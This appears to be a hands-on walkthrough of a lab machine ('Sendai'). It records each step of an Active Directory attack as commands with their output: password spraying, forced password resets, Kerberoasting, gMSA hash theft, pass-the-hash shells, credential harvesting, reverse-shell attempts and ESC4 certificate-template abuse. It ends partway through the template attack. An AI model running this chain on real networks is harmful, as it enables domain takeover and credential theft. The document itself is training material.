## NMAP SCAN 
```
nmap -sSCV -p- 10.129.234.66 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-11 22:33 +0700
Nmap scan report for 10.129.234.66
Host is up (0.080s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-11 10:06:03Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-08-18T12:30:05
|_Not valid after:  2026-08-18T12:30:05
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-08-18T12:30:05
|_Not valid after:  2026-08-18T12:30:05
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-08-18T12:30:05
|_Not valid after:  2026-08-18T12:30:05
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc.sendai.vl
| Not valid before: 2026-05-10T10:03:16
|_Not valid after:  2026-11-09T10:03:16
|_ssl-date: 2026-05-11T10:07:34+00:00; -5h30m00s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: SENDAI
|   NetBIOS_Domain_Name: SENDAI
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: sendai.vl
|   DNS_Computer_Name: dc.sendai.vl
|   DNS_Tree_Name: sendai.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-05-11T10:06:53+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
59962/tcp open  msrpc         Microsoft Windows RPC
59984/tcp open  msrpc         Microsoft Windows RPC
62984/tcp open  msrpc         Microsoft Windows RPC
63001/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-05-11T10:06:55
|_  start_date: N/A
|_clock-skew: mean: -5h29m59s, deviation: 0s, median: -5h29m59s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

```
smbclient -L //10.129.234.66/ -U ''
Password for [WORKGROUP\]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        config          Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        sendai          Disk      company share
        SYSVOL          Disk      Logon server share 
        Users           Disk      

```

sendai, Users and config are interesting shares
Users share does not have anything usefull 
```
smbclient //10.129.234.66/sendai -U ''
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 19 00:31:04 2023
  ..                                DHS        0  Wed Apr 16 09:55:42 2025
  hr                                  D        0  Tue Jul 11 19:58:19 2023
  incident.txt                        A     1372  Wed Jul 19 00:34:15 2023
  it                                  D        0  Tue Jul 18 20:16:46 2023
  legal                               D        0  Tue Jul 11 19:58:23 2023
  security                            D        0  Tue Jul 18 20:17:35 2023
  transfer                            D        0  Tue Jul 11 20:00:20 2023

                7019007 blocks of size 4096. 1185404 blocks available
smb: \> get incident.txt 
getting file \incident.txt of size 1372 as incident.txt (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
```

got this lets check it 
```
cat incident.txt 
Dear valued employees,

We hope this message finds you well. We would like to inform you about an important security update regarding user account passwords. Recently, we conducted a thorough penetration test, which revealed that a significant number of user accounts have weak and insecure passwords.

To address this concern and maintain the highest level of security within our organization, the IT department has taken immediate action. All user accounts with insecure passwords have been expired as a precautionary measure. This means that affected users will be required to change their passwords upon their next login.

We kindly request all impacted users to follow the password reset process promptly to ensure the security and integrity of our systems. Please bear in mind that strong passwords play a crucial role in safeguarding sensitive information and protecting our network from potential threats.

If you need assistance or have any questions regarding the password reset procedure, please don't hesitate to reach out to the IT support team. They will be more than happy to guide you through the process and provide any necessary support.

Thank you for your cooperation and commitment to maintaining a secure environment for all of us. Your vigilance and adherence to robust security practices contribute significantly to our collective safety.   
```

so on next login the password change prompt will open for users.... 
```
smb: \> cd transfer\
smb: \transfer\> ls
  .                                   D        0  Tue Jul 11 20:00:20 2023
  ..                                  D        0  Wed Jul 19 00:31:04 2023
  anthony.smith                       D        0  Tue Jul 11 19:59:50 2023
  clifford.davey                      D        0  Tue Jul 11 20:00:06 2023
  elliot.yates                        D        0  Tue Jul 11 19:59:26 2023
  lisa.williams                       D        0  Tue Jul 11 19:59:34 2023
  susan.harper                        D        0  Tue Jul 11 19:59:39 2023
  temp                                D        0  Tue Jul 11 20:00:16 2023
  thomas.powell                       D        0  Tue Jul 11 19:59:45 2023
```

got users 
```
smb: \> cd it
\smb: \it\> \ls
\ls: command not found
smb: \it\> ls
  .                                   D        0  Tue Jul 18 20:16:46 2023
  ..                                  D        0  Wed Jul 19 00:31:04 2023
  Bginfo64.exe                        A  2774440  Tue Jul 18 20:16:43 2023
  PsExec64.exe                        A   833472  Tue Jul 18 20:16:38 2023

                7019007 blocks of size 4096. 1139700 blocks available
smb: \it\> get Bginfo64.exe 
getting file \it\Bginfo64.exe of size 2774440 as Bginfo64.exe (533.5 KiloBytes/sec) (average 336.5 KiloBytes/sec)
smb: \it\> get PsExec64.exe 
getting file \it\PsExec64.exe of size 833472 as PsExec64.exe (441.2 KiloBytes/sec) (average 356.0 KiloBytes/sec)

```

got 2 files from it lets look at decompiler
nothing use fulll 
```
nxc smb 10.129.234.66 -u /home/kali/HTB\ BOXES/Sendai/users.txt -p /home/kali/HTB\ BOXES/Sendai/users.txt --continue-on-success | grep "+"
SMB                      10.129.234.66   445    DC               [+] sendai.vl\clifford.davery:anthony.smith (Guest)
SMB                      10.129.234.66   445    DC               [+] sendai.vl\sussan.harper:anthony.smith (Guest)
SMB                      10.129.234.66   445    DC               [+] sendai.vl\temp:anthony.smith (Guest)
```

so this is interesting maybe we can access the config share now.... 
no we cannot access it yet 
lets RID brute force to see if there are more users 
```
impacket-lookupsid anonymous@10.129.234.66
Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at 10.129.234.66
[*] StringBinding ncacn_np:10.129.234.66[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-3085872742-570972823-736764132
498: SENDAI\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: SENDAI\Administrator (SidTypeUser)
501: SENDAI\Guest (SidTypeUser)
502: SENDAI\krbtgt (SidTypeUser)
512: SENDAI\Domain Admins (SidTypeGroup)
513: SENDAI\Domain Users (SidTypeGroup)
514: SENDAI\Domain Guests (SidTypeGroup)
515: SENDAI\Domain Computers (SidTypeGroup)
516: SENDAI\Domain Controllers (SidTypeGroup)
517: SENDAI\Cert Publishers (SidTypeAlias)
518: SENDAI\Schema Admins (SidTypeGroup)
519: SENDAI\Enterprise Admins (SidTypeGroup)
520: SENDAI\Group Policy Creator Owners (SidTypeGroup)
521: SENDAI\Read-only Domain Controllers (SidTypeGroup)
522: SENDAI\Cloneable Domain Controllers (SidTypeGroup)
525: SENDAI\Protected Users (SidTypeGroup)
526: SENDAI\Key Admins (SidTypeGroup)
527: SENDAI\Enterprise Key Admins (SidTypeGroup)
553: SENDAI\RAS and IAS Servers (SidTypeAlias)
571: SENDAI\Allowed RODC Password Replication Group (SidTypeAlias)
572: SENDAI\Denied RODC Password Replication Group (SidTypeAlias)
1000: SENDAI\DC$ (SidTypeUser)
1101: SENDAI\DnsAdmins (SidTypeAlias)
1102: SENDAI\DnsUpdateProxy (SidTypeGroup)
1103: SENDAI\SQLServer2005SQLBrowserUser$DC (SidTypeAlias)
1104: SENDAI\sqlsvc (SidTypeUser)
1105: SENDAI\websvc (SidTypeUser)
1107: SENDAI\staff (SidTypeGroup)
1108: SENDAI\Dorothy.Jones (SidTypeUser)
1109: SENDAI\Kerry.Robinson (SidTypeUser)
1110: SENDAI\Naomi.Gardner (SidTypeUser)
1111: SENDAI\Anthony.Smith (SidTypeUser)
1112: SENDAI\Susan.Harper (SidTypeUser)
1113: SENDAI\Stephen.Simpson (SidTypeUser)
1114: SENDAI\Marie.Gallagher (SidTypeUser)
1115: SENDAI\Kathleen.Kelly (SidTypeUser)
1116: SENDAI\Norman.Baxter (SidTypeUser)
1117: SENDAI\Jason.Brady (SidTypeUser)
1118: SENDAI\Elliot.Yates (SidTypeUser)
1119: SENDAI\Malcolm.Smith (SidTypeUser)
1120: SENDAI\Lisa.Williams (SidTypeUser)
1121: SENDAI\Ross.Sullivan (SidTypeUser)
1122: SENDAI\Clifford.Davey (SidTypeUser)
1123: SENDAI\Declan.Jenkins (SidTypeUser)
1124: SENDAI\Lawrence.Grant (SidTypeUser)
1125: SENDAI\Leslie.Johnson (SidTypeUser)
1126: SENDAI\Megan.Edwards (SidTypeUser)
1127: SENDAI\Thomas.Powell (SidTypeUser)
1128: SENDAI\ca-operators (SidTypeGroup)
1129: SENDAI\admsvc (SidTypeGroup)
1130: SENDAI\mgtsvc$ (SidTypeUser)
1131: SENDAI\support (SidTypeGroup)

```

now lets look at the users 
```
nxc smb 10.129.234.66 -u /home/kali/HTB\ BOXES/Sendai/user.txt -p '' --continue-on-success 
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [-] sendai.vl\sqlsvc: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\websvc: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Dorothy.Jones: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Kerry.Robinson: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Naomi.Gardner: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Anthony.Smith: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Susan.Harper: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Stephen.Simpson: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Marie.Gallagher: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Kathleen.Kelly: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Norman.Baxter: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Jason.Brady: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Elliot.Yates: STATUS_PASSWORD_MUST_CHANGE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Malcolm.Smith: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Lisa.Williams: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Ross.Sullivan: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Clifford.Davey: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Declan.Jenkins: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Lawrence.Grant: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Leslie.Johnson: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Megan.Edwards: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\mgtsvc$: STATUS_LOGON_FAILURE 

```

so for Elliot.Yates and Thomas.Powell the password must change.... 
```
nxc smb 10.129.234.66 -u Thomas.Powell -p '' -M change-password -o NEWPASS=Password@123 
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [-] sendai.vl\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE 
CHANGE-P... 10.129.234.66   445    DC               [+] Successfully changed password for Thomas.Powell
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ nxc smb 10.129.234.66 -u Thomas.Powell -p 'Password@123'                                
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Thomas.Powell:Password@123
```

ok changed the pass lets use rusthound and get into bloodhound 
![[Pasted image 20260511162520.png]]

found 2 kerberoastable users.. 
```
impacket-GetUserSPNs 'sendai.vl/Thomas.Powell:Password@123' -dc-ip 10.129.234.66 -request 
Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
--------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQL/dc.sendai.vl    sqlsvc            2023-07-11 16:51:18.413329  2026-05-11 17:05:48.956855             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*sqlsvc$SENDAI.VL$sendai.vl/sqlsvc*$069f6f11f289d6fdd75657ef2476fe7e$dd6fa3c2ad039e304276aa71c164c6eb45ef36b5ff84b49898ee8b19bdeaed4545edc999dfd58a6a39d78f897e8fb6068fd563378949aee3035182ae62c4ef28ff81b0517992897198bf3323ca406af831d01354afd72ca534becc83d5ee7ca30f0c652472e82c2f065b914803c74eeef3cb3405b58922ce6f152ddf35218971b98d1c085a054b4d2cb0c2b30013780dcc7ea6540ef43f69ac7c452f7fdce9a9246c7936325496434061f8ec1cdeceabaeb3ecaffe49d3e8d13d9caecdb8ec13120a35c8b60c45991c4b79ab8e4c1bd838fafb176655bfe454e0d77f056929093665b55662e800f9f6da136d69cd02f8a2e5ba5f53f0b18715b59f19cbea18d7b77a2d9dd820abee81fe1c5b4d333dab24bee4bb7bc6206a83cdc6d2e1fa4be25687d8bb5f151304cba5c5b9154a6f242f7041f92ecc3629794f8769f3a24d87119b66670444dbf702c71acba51a3dd5ef60f10d8dd9ea10202273edc220a908c762c7ef3d0e972fc9c40bb21540d038ac1412a886ab972efaa4621ecdc926a792d87c67877b431a9a6b6c6251ea65f88e44e2159a25a09ce6f036c84daa269782cd5afa1a240f519e88c795f13c38c027f3e6861f126b6f1dd85c03f63fc5eb3c5ce45cc0c2e1f6ca10e12b071d5e54aaf238cad7ac720078790f85c1344d2f3e011fb4f68496ac3e6b6a4160dc4ee3542fdf641b3c026c514976b239b1d6e82c1bee95234784a54c7404b3e4ff98362c927febf376cd254d77a4a10fbd2950188cefba860c75b9c3336ab2d39243917bb5d82b107523d655589987270581898a3826c5f854d608c32a6150818cd37caac79b623c519ae25092354962e7af5e3b5ee2606b4b457735dbb7ae83c578c1f4ff8b2b91919eaea565470c016b75a4c3aeb3798ab8620cedc785ea8f57960aaef5b233915d29b18bf357cf91f8799402a2e7e358677c8e3d87a77a69f2e6d59c7f0101304c7a184b66434f25288de50d944bd64c26e635e840fddc8d14ef0efcd3cbd9b290fce698eb6cc812fa0dc5fb0ec2259eb08011198e47b19e9d9722d053397824e35e3a1ac10859669cd0726d2bc6626499145bf1da7e2353d0228cf98e03ed510905060dfb7db495c3bae1f41f0149821a40c633ee06d4e4943c0523e9f3f0a7d6e1fcee5ff6efcbcdf0eaa0687f74ce7ea2519cb48ffa7f51a29ad75fda5dd971f3a712366c95d3fb9fa897f06c06491dc924aae6bf462e14e0592e544d8bcfe24ef226dfc5ac82791359f126d8681045999d076d5e15545401c3ee3b431a54310149698813884caa9034f36818701028776cea26e1a606b72673933c608b83680b1db4e5b94b281aaf67f03262ef2ced5f65e068d59b311b9d82164ce65900d95aac88968bb8fb008d6603c431b73164a665020590d08e19064c1e88b255385a4539e2766566d55d30b89ad3c4ec9973227e4022ba08093aa2408d62ec5a3eafb7dfe4758a496c4b16a045087b8ee2a317e4f878b06123f3fc9bb0be41b3e8f5993a5873b933834282f13036f72a177d612c345c4690e891592ddb10bf8a050463

```

uncrackable...

So there are 2 attack paths 
```
1. Enroll ourselfs to any template and go from there 
2. We have GenericAll on ADMSVC group which can read gMSApassword of MGTSVC$
```

```
bloodyAD -d sendai.vl -u 'Thomas.Powell' -p 'Password@123' --host 10.129.234.66 add groupMember 'ADMSVC' 'Thomas.Powell'
[+] Thomas.Powell added to ADMSVC
```
now lets get the password 
```
nxc ldap 10.129.234.66 -u 'Thomas.Powell' -p 'Password@123' -d sendai.vl --gmsa
LDAP        10.129.234.66   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) (signing:None) (channel binding:Never) 
LDAP        10.129.234.66   389    DC               [+] sendai.vl\Thomas.Powell:Password@123 
LDAP        10.129.234.66   389    DC               [*] Getting GMSA Passwords
LDAP        10.129.234.66   389    DC               Account: mgtsvc$              NTLM: 79ce2a2c1488fba8ef0aeaeaed141050     PrincipalsAllowedToReadPassword: admsvc

```

got ntlm hash for mgtsvc$ user and we can winrm using this 
```
evil-winrm -i 10.129.234.66 -u 'mgtsvc$' -H 79ce2a2c1488fba8ef0aeaeaed141050
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mgtsvc$\Documents> cd C:\
*Evil-WinRM* PS C:\> type user.txt
fff335936142d21a6fa44123b897cd3e

```

and we got the user flag
```
*Evil-WinRM* PS C:\> ls


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         7/11/2023   5:56 AM                config
d-----         4/15/2025   8:20 PM                inetpub
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---         4/15/2025   7:51 PM                Program Files
d-----         7/18/2023   6:11 AM                Program Files (x86)
d-----         7/18/2023  10:31 AM                sendai
d-----         7/11/2023   2:35 AM                SQL2019
d-r---         5/11/2026   4:04 AM                Users
d-----         8/18/2025   5:04 AM                Windows
-a----         4/15/2025   8:27 PM             32 user.txt


*Evil-WinRM* PS C:\> cd config
*Evil-WinRM* PS C:\config> ls


    Directory: C:\config


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         7/11/2023   5:57 AM             78 .sqlconfig


*Evil-WinRM* PS C:\config> download .sqlconfig
                                        
Info: Downloading C:\config\.sqlconfig to .sqlconfig
                                        
Info: Download successful!
```

lets have a look at it 
```
cat .sqlconfig    
Server=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=SurenessBlob85; 

nxc smb 10.129.234.66 -u sqlsvc -p 'SurenessBlob85'                        
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [+] sendai.vl\sqlsvc:SurenessBlob85
```
good we got the pass.. 
sqlsvc:SurenessBlob85

lets use runas to get a shell as sqlsvc... 
```
*Evil-WinRM* PS C:\ProgramData> .\RunasCs.exe sqlsvc SurenessBlob85 powershell.exe -r 10.10.14.66:9001
[-] RunasCsException: Selected logon type '2' is not granted to the user 'sqlsvc'. Use available logon type '3'.
```
```
*Evil-WinRM* PS C:\ProgramData> .\RunasCs.exe sqlsvc SurenessBlob85 "cmd.exe" -r 10.10.14.66:9001 -l 3 --remote-impersonation
[-] RunasCsException: WSAConnect failed with error code: 10061
*Evil-WinRM* PS C:\ProgramData> .\RunasCs.exe sqlsvc SurenessBlob85 "cmd.exe" -r 10.10.14.66:9001 -l 3 --remote-impersonation

[+] Running in session 0 with process function 'Remote Impersonation'
[+] Using Station\Desktop: Service-0x0-5a9f15$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 4408 created in background.
```

we connot do runas of psexec of this user....
lets use winPEAS maybe we get something..... nothing...

```
*Evil-WinRM* PS C:\> cd inetpub
*Evil-WinRM* PS C:\inetpub> ls


    Directory: C:\inetpub


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         7/11/2023   2:27 AM                custerr
d-----         4/15/2025   8:20 PM                DeviceHealthAttestation
d-----         7/11/2023   2:27 AM                ftproot
d-----         4/15/2025   8:24 PM                history
d-----         7/18/2023   5:41 AM                logs
d-----         7/18/2023   5:38 AM                service
d-----         7/11/2023   2:27 AM                temp
d-----         7/11/2023   6:25 AM                wwwroot


*Evil-WinRM* PS C:\inetpub> cd logs
*Evil-WinRM* PS C:\inetpub\logs> ls
Access to the path 'C:\inetpub\logs' is denied.
At line:1 char:1
+ ls
+ ~~
    + CategoryInfo          : PermissionDenied: (C:\inetpub\logs:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
*Evil-WinRM* PS C:\inetpub\logs> cd ..
*Evil-WinRM* PS C:\inetpub> cd DeviceHealthAttestation
*Evil-WinRM* PS C:\inetpub\DeviceHealthAttestation> ls


    Directory: C:\inetpub\DeviceHealthAttestation


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         8/18/2025   5:04 AM                bin


*Evil-WinRM* PS C:\inetpub\DeviceHealthAttestation> cd bin
*Evil-WinRM* PS C:\inetpub\DeviceHealthAttestation\bin> ls


    Directory: C:\inetpub\DeviceHealthAttestation\bin


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         8/18/2025   4:53 AM         208896 hassrv.dll

```
there must be a process for it 
```
*Evil-WinRM* PS C:\> Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    214       8     7960      13620              4008   0 AggregatorHost
    390      33    12368      21676              1312   0 certsrv
     81       6     2260       4012              3588   0 cmd
    150      10     6564      13240              3612   0 conhost
    571      22     2044       6508               424   0 csrss
    176      11     1844       6040               544   1 csrss
    417      35    16588      25328               704   0 dfsrs
    198      13     2344       8600              3492   0 dfssvc
    280      15     4032      15164              3116   0 dllhost
  10377    9684   129592     128352              3012   0 dns
    633      26    19416      46788               364   1 dwm
    167      12    23960      17592              4948   0 EC2Launch
     72       6      780       3764              3344   0 EC2LaunchService
     39       6     1492       4104              4856   1 fontdrvhost
     39       6     1340       3708              4860   0 fontdrvhost
    198      12    12272      12632              3152   0 helpdesk
```

```
*Evil-WinRM* PS C:\> Get-ChildItem -Path HKLM:\SYSTEM\CurrentControlSet\services | Get-ItemProperty | Select-Object ImagePath | Select-String helpdesk

@{ImagePath=C:\WINDOWS\helpdesk.exe -u clifford.davey -p RFmoB2WplgE_3p -k netsvcs}
```
got creds for 
clifford.davey:RFmoB2WplgE_3p
lets also check for sql service since there is a sql folder and a user 
```
*Evil-WinRM* PS C:\> netstat -ano | select-string 1433

  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       5212
  TCP    [::]:1433              [::]:0                 LISTENING       5212
  UDP    0.0.0.0:61433          *:*                                    3012

```

so there are 2 attack paths now 
```
1. Port forward for sqlsvc user and create a silver ticket since we could get hash using GetUserSPNs 
2. Using Clifford.Davey user and exploit the SENDAICOMPUTER template
```

Lets do no. 2
![[Pasted image 20260511170445.png]]

```
certipy-ad find -u clifford.davey -p RFmoB2WplgE_3p -dc-ip 10.129.234.66 -vulnerable -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 16 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sendai-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'sendai-DC-CA'
[*] Checking web enrollment for CA 'sendai-DC-CA' @ 'dc.sendai.vl'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sendai-DC-CA
    DNS Name                            : dc.sendai.vl
    Certificate Subject                 : CN=sendai-DC-CA, DC=sendai, DC=vl
    Certificate Serial Number           : 326E51327366FC954831ECD5C04423BE
    Certificate Validity Start          : 2023-07-11 09:19:29+00:00
    Certificate Validity End            : 2123-07-11 09:29:29+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SENDAI.VL\Administrators
      Access Rights
        ManageCa                        : SENDAI.VL\Administrators
                                          SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
        ManageCertificates              : SENDAI.VL\Administrators
                                          SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
        Enroll                          : SENDAI.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : SendaiComputer
    Display Name                        : SendaiComputer
    Certificate Authorities             : sendai-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 100 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2023-07-11T12:46:12+00:00
    Template Last Modified              : 2023-07-11T12:46:19+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Domain Computers
                                          SENDAI.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : SENDAI.VL\Administrator
        Full Control Principals         : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Owner Principals          : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Dacl Principals           : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Property Enroll           : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Domain Computers
                                          SENDAI.VL\Enterprise Admins
    [+] User Enrollable Principals      : SENDAI.VL\Domain Computers
                                          SENDAI.VL\ca-operators
    [+] User ACL Principals             : SENDAI.VL\ca-operators
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.
```

ok so we can ESC4
```
certipy-ad template -u clifford.davey -p RFmoB2WplgE_3p -dc-ip 10.129.234.66 -template SendaiComputer -write-default-configuration -no-save
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'SendaiComputer'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Minimal-Key-Size: 2048
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'SendaiComputer'? (y/N): y
[*] Successfully updated 'SendaiComputer'
```

good lets check again 

```
